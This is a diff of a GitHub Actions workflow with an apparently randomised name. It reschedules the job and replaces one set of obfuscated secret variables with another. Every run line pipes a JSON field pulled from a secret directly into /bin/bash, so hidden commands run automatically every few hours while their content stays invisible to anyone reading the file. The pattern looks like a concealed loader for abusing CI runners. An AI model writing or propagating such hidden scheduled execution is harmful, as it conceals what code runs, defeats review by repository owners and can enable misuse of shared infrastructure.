@@ -2,28 +2,21 @@ name: fujiancheng7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
+    - cron: '15 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fujiancheng7654
         env:
-          lyt2: ${{ secrets.lyt2 }}
+          adx85419: ${{ secrets.adx85419 }}
         run: |
-          echo $lyt2 | jq -r .c129 | /bin/bash
-          echo $z2 | jq -r .m3815 | /bin/bash
-          echo $tcpt8575 | jq -r .tefbb084 | /bin/bash
-          echo $fxz41 | jq -r .jam4 | /bin/bash
-          echo $p719 | jq -r .jzh178 | /bin/bash
-          echo $bvvn4948 | jq -r .j6148 | /bin/bash
-          echo $kahgo76759 | jq -r .gsl57 | /bin/bash
-          echo $phzng8 | jq -r .ce957 | /bin/bash
-          echo $bktln7757 | jq -r .rnsvp60796 | /bin/bash
-          echo $qx48 | jq -r .kuxn85 | /bin/bash
-          echo $imalj3179 | jq -r .mmcv73 | /bin/bash
-          echo $m1893 | jq -r .zt081 | /bin/bash
-          echo $axxky99843 | jq -r .loc0376 | /bin/bash
+          echo $adx85419 | jq -r .jyz846 | /bin/bash
+          echo $ifnfp59021 | jq -r .kclmp9 | /bin/bash
+          echo $kktnz6 | jq -r .cfx4 | /bin/bash
+          echo $zgtjr169 | jq -r .elzp719 | /bin/bash
+          echo $t054 | jq -r .wlrvu67 | /bin/bash
+          echo $cze3 | jq -r .col9 | /bin/bash
+          echo $epo8836 | jq -r .ncwbx51 | /bin/bash
 
